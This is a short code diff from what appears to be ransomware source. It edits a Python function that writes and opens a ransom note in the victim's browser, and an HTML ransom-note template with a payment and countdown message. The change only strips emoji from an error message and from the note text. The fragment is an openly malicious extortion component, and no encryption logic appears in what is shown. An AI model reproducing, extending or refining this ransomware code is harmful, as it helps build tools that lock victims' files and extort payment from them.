@@ -20,7 +20,7 @@ def generate_ransom_note(session_id):
         webbrowser.open(f"file://{ransom_note_path}")
     except Exception as e:
         logging.error(f"Failed to write ransom note: {e}")
-        print(f"❌ Failed to write ransom note: {e}")
+        print(f" Failed to write ransom note: {e}")
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -83,7 +83,7 @@ HTML_TEMPLATE = """
         </div>
 
         <div class="info">
-            ✅ If you have already paid and decrypted your files,<br>
+             If you have already paid and decrypted your files,<br>
             don't worry about the countdown timer.<br>
             <strong>Your files will NOT be deleted.</strong>
         </div>
